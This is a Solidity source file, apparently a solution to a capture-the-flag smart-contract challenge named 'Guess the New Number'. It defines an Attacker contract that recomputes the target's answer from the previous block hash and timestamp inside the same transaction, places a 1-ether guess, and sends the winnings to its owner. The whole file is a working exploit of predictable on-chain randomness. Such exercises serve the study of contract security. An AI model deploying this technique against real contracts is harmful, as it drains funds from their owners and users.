// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Attacker {
    address owner;

    error NotOwner();
    error ValueErr();
    error GuessErr();

    constructor() {
        owner = msg.sender;
    }

    function attack(address _challenge) public payable {
        if (msg.sender != owner) revert NotOwner();
        if (msg.value != 1 ether) revert ValueErr();

        IGuessTheNewNumberChallenge challenge = IGuessTheNewNumberChallenge(_challenge);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: 1 ether}(answer);

        if (!challenge.isComplete()) revert GuessErr();

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
    function isComplete() external view returns (bool);
}
